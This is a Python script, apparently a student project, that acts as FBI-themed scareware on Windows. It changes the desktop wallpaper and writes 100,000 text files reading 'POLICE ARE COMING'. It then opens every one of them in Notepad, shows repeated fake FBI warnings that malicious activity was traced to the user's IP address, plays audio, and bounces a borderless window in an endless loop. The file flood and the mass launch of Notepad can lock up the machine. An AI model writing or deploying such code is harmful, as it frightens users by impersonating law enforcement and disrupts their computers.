import easygui
import tkinter
from random import randint
from pygame import mixer
from time import sleep
import ctypes
import struct
import os

PATH = b'C:\Final Project\Bin\image.png'
SPI_SETDESKWALLPAPER = 20

def is_64bit_windows():
    return struct.calcsize('P') * 8 == 64
def changeBG(path):
    if is_64bit_windows():
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, PATH, 3)
    else:
        ctypes.windll.user32.SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, PATH, 3)
        
changeBG(PATH)

for i in range(100000):
      f= open("FBI %d.txt" % (i+1),"w+")
      for i in range(50):
          f.write("POLICE ARE COMING. Don't move.\r\n")
for i in range(100000):
    os.system("notepad.exe FBI %d.txt" % (i+1))
      
      
easygui.msgbox("Malicious activity has been traced back to this IP Address. DO NOT MOVE. THIS IS A MESSAGE FROM THE FBI.", title="Federal Bureau of Investigation (FBI)")


# Create a window:
window = tkinter.Tk()

# Setup the image:
img_obj = tkinter.PhotoImage(file='fbi.png')
img_label = tkinter.Label(window, image=img_obj)
img_label.image = 'fbi.png'
img_label.pack()
width, height = img_obj.width(), img_obj.height()

# Setup the windows:
screen_width = window.winfo_screenwidth()
screen_height = window.winfo_screenheight()
window.title('FBI.EXE')
window.resizable(False, False)
window.overrideredirect(True)

def random_x():
    return randint(0, screen_width - width)
def random_y():
    return randint(0, screen_height - height)
def random_vel():
    speed = 50
    vel = randint(-speed, speed)
    if vel == 0:
        return random_vel()
    return vel

x = random_x()
y = random_y()
x_vel = random_vel()
y_vel = random_vel()

# Setup the sound:
mixer.init()
sound = 'FBI.mp3'
mixer.music.load(sound)
mixer.music.play()

for i in range(5):
    easygui.msgbox("Malicious activity has been traced back to this IP Address. DO NOT MOVE. THIS IS A MESSAGE FROM THE FBI.", title="Federal Bureau of Investigation (FBI)")

# Main loop:
while True:
    
    sleep(0.01)
    
    if x >= (screen_width - width) and x_vel > 0:
        x_vel = -x_vel
    elif x <= 0 and x_vel < 0:
        x_vel = -x_vel

    if y >= (screen_height - height) and y_vel > 0:
        y_vel = -y_vel
    elif y <= 0 and y_vel < 0:
        y_vel = -y_vel
        
    x += x_vel
    y += y_vel
    
    if randint(1, 1000) == 1000:
        x_vel = random_vel()
        y_vel = random_vel()

        
    window_string = str(width) + 'x' + str(height) + '+' + str(x) + '+' + str(y)

    window.geometry(window_string)
    
    window.update()
